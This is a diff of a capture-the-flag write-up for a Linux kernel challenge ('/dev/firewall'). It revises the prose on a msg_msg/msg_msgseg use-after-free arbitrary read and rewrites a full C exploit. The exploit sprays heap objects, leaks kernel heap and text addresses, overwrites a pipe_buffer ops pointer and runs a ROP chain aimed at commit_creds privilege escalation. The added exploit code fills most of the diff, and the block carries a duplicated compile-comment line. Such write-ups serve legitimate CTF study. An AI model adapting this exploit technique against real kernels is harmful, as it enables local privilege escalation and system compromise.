@@ -50,8 +50,21 @@ I divided the whole write-up into three parts and each part solves an individual
 - Hijack the Control Flow and ROP
 - Bypass FG-KASLR
 
-
 # 0x02 Arbitrary Address Read
+
+There is a generic way to archive arbitrary address read based on UAF and msgMsg.
+
+- Create a UAF slot-0
+- Refill slot-0 with `struct msg_msg`
+- UAF-Free slot-0
+- Refill slot-0 with `struct msg_msgseg` 
+- We can control the data on `msg_msgseg` to set `msg_msg.m_ts = 0x2000`
+- msgPeek to OOB read
+
+
+This method is very useful since it only requires UAF-Free.
+
+<!-- # 0x02 Arbitrary Address Read
 
 When we are attacking small objects, we may not have good candidates to leak. The most common objects used to leak is [struct msg_msg][6] and [struct msg_msgseg][7]
 
@@ -108,11 +121,11 @@ Utilizing the linked-list pointers in `struct msg_msg`. I have a way to leak cur
 ## Arbitrary Address Read
 
 With the Link and Leak skill in the previous section, we are able to leak the data on the blue msg_msg struct, including a heap pointer to the red `msg_msgseg`(fake) object, which is also an `msg_msg` object on the blue `msg_msg` queue. So we can UAF-Write(edit-rule in the challenge) the red `msg_msgseg` object to fake a msg_msgseg. With this primitive, we can leak almost all the address space as long as there are 8 zero bytes before the stuff we want to leak (their offset should be less than 0xff8). Therefore, we can leak some kernel code segment pointers to compute `kernel.text`.
-
+ -->
 
 # 0x03 Hijack the Control Flow and ROP
 
-After leaking the addresses, it's hijack the `$RIP` with UAF-Write. I chose the `ops` pointer in the `pipe_buffer` object:
+After leaking the addresses, it's hijack the `$RIP` with UAF. I chose the `ops` pointer in the `pipe_buffer` object:
 
 - I created a UAF slot and refilled it with `pipe_buffer`
 - Use UAF Write(edit-rule in the challenge) to set the `ops` pointer to the kernel heap area
@@ -157,6 +170,7 @@ All the problems are solved.
 # 0x05 Exploitation
 
 ```python
+//gcc main.c -o ./main -lx -w
 //gcc main.c -o ./main -lx -w
 #include "libx.h"
 #if defined(LIBX)
@@ -204,7 +218,7 @@ u64  addr_kstrtab_commit_creds = 0xffffffff81b4fc04;
 void tainRegs(u64 base,u64 heap){
     
     pivot = 0xffffffff810043cf - NO_ASLR_BASE + base; 
-    target_heap = heap + 0x10e00;
+    target_heap = heap + 0x30e00;
     pivot = (pivot << 0x8) + 0xff;
     target_heap = (target_heap << 0x8) + 0xff;
 
@@ -304,7 +318,7 @@ void sprayROPChain(u64 base,u64 heap_addr){
     u64 rdi                 = 0xffffffff8100447c- NO_ASLR_BASE + base;
     u64 ret                 = rdi + 1;
     
-
+    heap_addr = heap_addr + 0x30000;
 
     u64 code_addr = heap_addr;
     u64 * rop = calloc(1,0x1000);
@@ -351,118 +365,79 @@ void ControlRIP(u64 base,u64 heap){
     tainRegs(base,heap);
     write(pipe_fd[0][0],"n",1);
     write(pipe_fd[0][1],"1",1);
-    write(pipe_fd[1][0],"3",1);
-    write(pipe_fd[1][1],"2",1);
 }
 int main(){
     libxInit();
-    void * trivial_data = calloc(1,0x2000);
     int mq[0x10];
     for(int i = 0 ; i<0x10;i++)
         mq[i] = msgGet();
-    
     fd = open("/dev/firewall",2);
-    msgSend(mq[0xd],0xfd0,calloc(1,0xfd0));
-    // Prepare: Drain 0x40
-    msgSpray_t *x1 = msgSpray(0x10,0x240,dp('h',0x10));
-    // Create Msg-Chain    
-        // Create 3 UAF slots
-        add(0,0,"255.255.255.1","255.255.255.255");
-        add(0,1,"255.255.255.2","255.255.255.255");
-        add(0,2,"255.255.255.3","255.255.255.255");
-        duplicate(0,0);
-        duplicate(0,1);
-        duplicate(0,2);
-            // Here we need to keep one more ptr for s0 at position(1,3)
-            del(0,0);
-            add(0,0,"255.255.255.1","255.255.255.255");
-            duplicate(0,0); //  > 1,3 
-        // Free s0
-        del(0,0);
-        msgSend(mq[0], 0xfd0+0x38, trivial_data);
-        // Create a msg_msg obj as the prev (which one we gonna leak)
-        msgSend(mq[1],0x10,dp(' ',0x10));
-        // UAF free s0
-        del(1,0);
-        // Refill s0
-        msgSend(mq[1],0x10,dp('0',0x10));
-        // Free s1 and refill 
-        del(0,1);
-        msgSend(mq[1],0x10,dp('1',0x10));
-        // fengshui
-        msgSend(mq[0xf],0xfd0,dp('o',0x1008));
-        // UAF free s1 and refill to make sure it starts with p64(0)
-        msgRecv(mq[0xd],1);
-        del(1,1);
-        msgSend(mq[2],0xfd0+0x38,dp('i',0x1008));
-    // Leak Heap 
-    msgMsg * res = msgPeek(mq[0],0x2000);
-    u64 *ptr = res->mtext;
-    u64 ct = 0xfd0/8;
-    u64 leaked = ptr[ct];
-    u64 current_page = leaked >> 12 << 12;
-    warn(hex(leaked));
-    // AAR
-    del(1,3);
-    add(1,3,"255.255.255.1","255.255.255.255");
-    duplicate(1,3); // > 0,0
-    del(1,3); // Free slot 0
-    msgSend(mq[3],0x10,dp('9',0x10));
 
-    // Spawn an AAR Target;
-    del(0,2);
+    msgSpray(0x10,0x2000/0x40,dp('1',0x10));
+
+    add(0,0,"255.255.255.255","255.255.255.255");
+    duplicate(0,0);
+    del(0,0);
+    add(0,0,"255.255.255.255","255.255.255.255");
+    duplicate(0,0);
+    del(0,0);
+    msgSend(mq[0],0x10,dp('0',0x10));
+    del(1,1);
+    size_t a[] = {1,0x800,0x2000,0,0,0xdead,0xbeef};
+    char * fake  = flatn(a,7);
+    char * payload = calloc(0x1,0x1000);
+    memcpy(payload+0xfd0,fake,0x38);
+    msgSend(mq[1],0xfd0+0x38,payload);
+    add(0,0,"255.255.255.255","255.255.255.255");
+    duplicate(0,0); // > 1,1
+    del(1,1);
     pipeBufferResize(pipe_fd[0][0],1);
-    pipeBufferResize(pipe_fd[1][0],1); // Improve the success rate from 50% to 66%
-
-    // Leak Code Base    
-    u64 msg_struct[8] = {0,0,0x800,0xfd0,0,0,0,0};
-    u64 *pay = flatn(msg_struct,8);
-    edit(0,0,pay);
-    res     = msgPeek(mq[3],0xfd0);
-    ptr     = res->mtext;
-    size_t code = 0 ;
-    size_t tmp_data[8] = {0};
-    for( int i = 2 ; i < (0xfd0)/8 - 4; i+=8 )
+    msgMsg * res = msgPeek(mq[0],0x2000);
+    size_t * ptr = res->mtext;
+    size_t base = 0 ; 
+    size_t current_page = 0 ; 
+    __u8 * meta = calloc(1,0x40) ;
+    for(int i = 0 ; i < 0x2000/8 ; i++)
     {
-        if( (ptr[i+2]  & 0xfff)==0xd00)
+        if(ptr[i] == 0x3131313131313131 && i>5)
         {
-            code  = ptr[i+2];
-            memcpy(tmp_data,&ptr[i],0x40);
+            current_page = ptr[i-6];
+            current_page = current_page>>12<<12;
+        }
+        if((ptr[i] & 0xfff )== 0xd00)
+        {
+            memcpy(meta,&ptr[i]-2,0x40);
+            base =  ptr[i]- (0xffffffff81a0ed00-0xffffffff81000000);
+        }
+        if(base!=0 && current_page !=0 )
             break;
-        }            
     }
-    if(code==0)
-        panic("Failed to leak Code (chance -> 1/3+1/2 = 5/6)");
-    u64 base = code - (0xffffffff81a0ed00-0xffffffff81000000);
-    info("Leaked Code Address: ");
-    warn(hex(base));
-
-
-    // Hijack pipe_buffer->op
-    info("Current Heap: ");
-    warn(hex(current_page));
-    tmp_data[2] = current_page + 0x3330;
-    edit(1,2,tmp_data);
+    if(!base || !current_page)
+        panic("Unfortunately");
     
-    // Spray Fake op objects
+    warn(hex(base));
+    warn(hex(current_page));
+    
+    ptr = payload;
     u64 RIP = 0xffffffff8100964c - NO_ASLR_BASE + base; // 0xffffffff8100964c: ret 0x149;
-    u64 * spray = calloc(1,0x1000);
-    for(int i = 0 ; i< 0x200 ; i ++)
-        spray[i] = RIP; // READ/WRITE, whoes stack fram == 0x58
-    u64 victim = current_page+0x10e00;
-    for(int i = 4 ; i < 0x8 ;i ++)
-        msgSend(mq[i],0xfd0,spray);
-    sprayROPChain(base,victim-0xe00);
+
+    for(int i = 0 ; i < 0x200 ; i++)
+        ptr[i] = RIP;
+    msgSpray(0xfd0,0x20000/0x1000,payload);
+    ptr = meta;
+    ptr[2] = current_page+0x900+0x10000;
+    edit(0,0,meta);
+    sprayROPChain(base,current_page+0x900-0x900);
     // debug();
-    ControlRIP(base,current_page);
+    ControlRIP(base, current_page);
 }
 ```
 
 # Epilogue
 
-- Created a method to leak with `msg_msg` + `UAF Free` on small objects: msg_msg Link and Leak
+- Learned the generic way to leak with `msg_msg` + `UAF Free`
 - Found `ret 0x.*` skill for RetSpill
-- Learned RetSpill/FG-KASLR Bypassing
+- Learned FG-KASLR Bypassing
 - Practiced Kernel Exploitation
 
 TODO:
